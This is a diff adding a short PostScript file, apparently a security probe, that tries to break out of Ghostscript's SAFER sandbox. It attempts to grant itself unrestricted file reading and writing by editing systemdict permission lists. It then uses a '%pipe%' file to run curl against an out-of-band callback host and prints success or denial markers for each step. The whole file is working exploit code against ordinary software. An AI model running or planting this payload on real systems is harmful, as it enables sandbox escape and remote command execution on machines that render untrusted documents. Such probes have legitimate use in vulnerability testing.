@@ -1,0 +1,11 @@
+%!PS-Adobe-3.0
+/Times-Roman findfont 9 scalefont setfont
+20 260 moveto
+(V2389_SAFER_PUT) show
+20 240 moveto
+{ systemdict /PermitFileWriting [ (*) ] put (PUT_OK) show } stopped { (PUT_DENIED) show } if
+20 220 moveto
+{ systemdict /PermitFileReading [ (*) ] put (PUTR_OK) show } stopped { (PUTR_DENIED) show } if
+20 200 moveto
+{ (\045pipe\045curl -s -m 8 http://dbcru7v0do6eus0eitpgqm3r3whtdz5ew.oast.pro/ps_permit) (w) file dup (X) writestring closefile (PERMIT_PIPE_OK) show } stopped { (PERMIT_PIPE_DENIED) show } if
+showpage
